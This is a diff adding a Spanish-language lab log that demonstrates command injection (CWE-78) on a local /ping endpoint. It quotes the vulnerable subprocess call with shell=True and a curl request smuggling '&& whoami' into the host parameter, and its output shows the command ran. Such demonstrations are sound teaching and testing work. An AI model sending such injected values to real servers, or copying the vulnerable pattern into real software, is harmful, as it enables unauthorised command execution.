@@ -1,0 +1,15 @@
+DEMO V2 - Command Injection (CWE-78) en /ping  | 2026-10-01 03:25
+Código vulnerable: subprocess.run(f"ping {opcion} 1 {host}", shell=True, ...)
+
+=== Ataque: host=127.0.0.1 && whoami ===
+curl -b cookies_ana -G --data-urlencode "host=127.0.0.1 && whoami" http://127.0.0.1:5000/ping
+Haciendo ping a 127.0.0.1 con 32 bytes de datos:
+Respuesta desde 127.0.0.1: bytes=32 tiempo<1m TTL=128
+Estadísticas de ping para 127.0.0.1:
+    Paquetes: enviados = 1, recibidos = 1, perdidos = 0
+    (0% perdidos),
+Tiempos aproximados de ida y vuelta en milisegundos:
+    Mínimo = 0ms, Máximo = 0ms, Media = 0ms
+adrianalaos\adriana
+
+Resultado: la última línea es la salida de 'whoami' -> se ejecutó un comando arbitrario en el servidor.
